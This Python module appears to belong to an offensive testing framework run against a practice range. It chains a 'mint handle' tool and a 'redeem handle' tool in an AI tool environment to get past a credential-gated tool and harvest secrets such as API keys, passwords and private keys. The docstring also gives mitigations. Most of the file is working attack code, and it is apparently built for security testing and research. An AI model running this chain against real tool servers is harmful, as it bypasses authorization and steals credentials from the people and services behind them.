"""CUT-PRIV-002 — Scope Escalation via Chaining.

No single tool the caller holds is privileged enough — but their *composition* is.
``ladder`` finds a capability-by-reference pair (a report/export subsystem: one tool mints
a handle to a resource, another redeems the handle) and chains them to reach data the
directly-scoped tool gates behind a credential. The escalation is emergent: every call is
non-sensitive and presents **no token**, yet the chain yields the same crown-jewel secret
that ``get_customer_secret`` refuses without the delegated token.

The demonstration is honest about the boundary it crosses. First a **control**: call the
directly-scoped tool as an unprivileged caller (no credential) — it is refused. Then the
**chain**: ``create_export(<sensitive resource>)`` → ``fetch_export(<job token>)`` — two
non-sensitive calls, still no credential — returns the very value the control was denied.
Refused-direct vs granted-by-chain, for the *same* principal and the *same* data, is the
scope escalation.

Detection / mitigation: propagate the caller's scope through the whole chain — no ambient
authority in the reporting/export backend. Authorize at *both* ends against the *principal*:
check the caller may read the resource at ``create_export`` time, and re-check at
``fetch_export`` time (a job token is a bearer capability, not proof of authorization).
Scope every derived handle to the grant that created it, and give the reporting subsystem
least-privilege reads rather than blanket access. Watch for chains where a low-scope tool's
output becomes a high-scope tool's input — that dataflow is the escalation.
"""

from __future__ import annotations

import inspect
from typing import Any

from cutout_range import connect_range

from cutout.engine.evidence import Phase
from cutout.engine.module import BaseModule, Option
from cutout.engine.registry import register
from cutout.engine.session import CheckResult, RunResult, Session

# A "minting" tool hands back a handle to a resource; a "redeeming" tool exchanges the
# handle for the data. Recognized by parameter name (works across naming conventions).
_MINT_PARAMS = {"resource", "target", "ref", "object", "path", "report"}
_REDEEM_PARAMS = {"job_token", "token", "handle", "job", "ticket", "receipt", "ref"}

# Resource names / field names that mark a leaked value as a crown jewel (a higher scope).
_SENSITIVE_RESOURCE_WORDS = ("secret", "credential", "cred", "env", "key", "password", "token")
_SENSITIVE_FIELDS = ("api_secret", "api_key", "password", "secret", "token", "private_key")


def _param(spec: Any, names: set[str]) -> str | None:
    for key in spec.params or {}:
        if str(key).lower() in names:
            return str(key)
    return None


def _looks_sensitive(name: str) -> bool:
    low = name.lower()
    return any(word in low for word in _SENSITIVE_RESOURCE_WORDS)


def _harvest(data: Any) -> dict[str, str]:
    """Pull any secret-looking field out of an export payload."""
    found: dict[str, str] = {}
    if isinstance(data, dict):
        for key, value in data.items():
            if str(key).lower() in _SENSITIVE_FIELDS and value is not None:
                found[str(key)] = str(value)
    return found


@register
class ScopeEscalation(BaseModule):
    id = "CUT-PRIV-002"
    alias = "ladder"
    name = "Scope Escalation via Chaining"
    tactic = "PRIV"
    targets = ["tool"]
    options = {
        "gated_tool": Option(
            help="A directly-scoped tool used as the control (refused without a credential).",
            default="get_customer_secret",
            type="str",
        ),
        "target_id": Option(
            help="Record ID the control tool is asked for.",
            default="VIP-001",
            type="str",
        ),
        "resource": Option(
            help="Specific resource to escalate to (default: auto-discover sensitive ones).",
            default="",
            type="str",
        ),
    }

    def _opt(self, key: str) -> str:
        val = self.opts.get(key)
        return str(val) if val is not None else str(self.options[key].default)

    def _find_chain(self, specs: list[Any]) -> tuple[Any, str, Any, str] | None:
        """Locate a (minter, mint_param, redeemer, redeem_param) capability-by-reference pair."""
        minter: tuple[Any, str] | None = None
        redeemer: tuple[Any, str] | None = None
        for spec in specs:
            if getattr(spec, "sensitive", False):
                continue  # the chain is built from LOW-scope tools only
            mint = _param(spec, _MINT_PARAMS)
            redeem = _param(spec, _REDEEM_PARAMS)
            # A redeemer takes a handle; prefer that classification when a param qualifies.
            if redeem and redeem != mint and redeemer is None:
                redeemer = (spec, redeem)
            elif mint and minter is None:
                minter = (spec, mint)
        if minter and redeemer:
            return minter[0], minter[1], redeemer[0], redeemer[1]
        return None

    async def _call(self, rng: Any, name: str, args: dict[str, Any]) -> dict[str, Any]:
        res = rng.call_tool(name, args)
        if inspect.isawaitable(res):
            res = await res
        return res  # type: ignore[no-any-return]

    async def check(self, session: Session) -> CheckResult:
        rng = connect_range(session.target)
        specs = rng.list_tools()
        chain = self._find_chain(specs)
        if chain is None:
            return CheckResult(
                module_id=self.id,
                susceptible=False,
                reason="no capability-by-reference tool pair (mint handle -> redeem handle)",
            )
        minter, _, redeemer, _ = chain
        return CheckResult(
            module_id=self.id,
            susceptible=True,
            reason=(
                f"low-scope chain available: {minter.qualified()} mints a handle "
                f"{redeemer.qualified()} redeems — composable past per-tool scope"
            ),
            data={"minter": minter.qualified(), "redeemer": redeemer.qualified()},
        )

    async def _resources(self, rng: Any, minter: Any) -> list[str]:
        """Discover exportable resource names (via a companion list tool if present)."""
        chosen = self._opt("resource")
        if chosen:
            return [chosen]
        for spec in rng.list_tools():
            if spec.server == minter.server and "list" in spec.name.lower():
                res = await self._call(rng, spec.name, {})
                data = res.get("data")
                if isinstance(data, list):
                    return [str(r) for r in data]
        return []

    async def run(self, session: Session) -> RunResult:
        rng = connect_range(session.target)
        specs = rng.list_tools()
        chain = self._find_chain(specs)
        if chain is None:
            return RunResult(status="skipped", summary="no chainable low-scope tool pair found")
        minter, mint_param, redeemer, redeem_param = chain
        await self.emit(
            Phase.RUN,
            "priv.begin",
            {"minter": minter.qualified(), "redeemer": redeemer.qualified()},
        )

        # Control: the directly-scoped tool refuses an unprivileged caller (no credential).
        gated = self._opt("gated_tool")
        control = await self._call(rng, gated, {"id": self._opt("target_id")})
        control_denied = not control.get("ok")
        await self.emit(
            Phase.RUN,
            "priv.baseline",
            {"tool": gated, "denied": control_denied, "error": control.get("error")},
        )

        # Pick the crown-jewel resources to escalate to.
        resources = await self._resources(rng, minter)
        targets = [r for r in resources if _looks_sensitive(r)] or resources
        if self._opt("resource"):
            targets = [self._opt("resource")]

        secrets_found: dict[str, str] = {}
        escalated: list[str] = []
        for resource in targets:
            minted = await self._call(rng, minter.name, {mint_param: resource})
            handle = None
            if minted.get("ok") and isinstance(minted.get("data"), dict):
                data = minted["data"]
                handle = data.get(redeem_param) or data.get("job_token") or data.get("token")
            await self.emit(
                Phase.RUN,
                "priv.chain",
                {
                    "step": "mint",
                    "tool": minter.qualified(),
                    "resource": resource,
                    "ok": bool(handle),
                },
            )
            if not handle:
                continue
            redeemed = await self._call(rng, redeemer.name, {redeem_param: handle})
            payload = redeemed.get("data") if redeemed.get("ok") else None
            loot = _harvest(payload)
            await self.emit(
                Phase.RUN,
                "priv.chain",
                {
                    "step": "redeem",
                    "tool": redeemer.qualified(),
                    "resource": resource,
                    "ok": redeemed.get("ok", False),
                    "secret_fields": sorted(loot),
                },
            )
            if loot:
                escalated.append(resource)
                for field, value in loot.items():
                    secrets_found[f"{redeemer.server}:{resource}:{field}"] = value

        session.secrets.update(secrets_found)
        session.artifacts["scope_escalations"] = escalated
        if secrets_found:
            await self.emit(Phase.RUN, "priv.escalated", {"secret_keys": sorted(secrets_found)})
        await self.emit(
            Phase.RUN,
            "priv.result",
            {"control_denied": control_denied, "escalated": escalated},
        )

        # Success requires BOTH: the direct path was gated AND the chain got past it.
        won = control_denied and bool(escalated)
        status = "success" if won else "failed"
        if won:
            summary = (
                f"escalated scope by chaining {minter.name} -> {redeemer.name}: "
                f"{gated} was denied without a token, but the chain leaked "
                f"{len(escalated)} gated resource(s) ({', '.join(escalated)}); "
                f"harvested {len(secrets_found)} secret(s)"
            )
        elif escalated:
            summary = (
                f"chained {minter.name} -> {redeemer.name} to read "
                f"{len(escalated)} resource(s), but the control tool was not gated"
            )
        else:
            summary = f"chain {minter.name} -> {redeemer.name} leaked no gated resource"
        return RunResult(
            status=status,
            summary=summary,
            data={
                "chain": f"{minter.qualified()} -> {redeemer.qualified()}",
                "control_denied": control_denied,
                "escalated": escalated,
                "harvested_secret_keys": sorted(secrets_found),
            },
        )
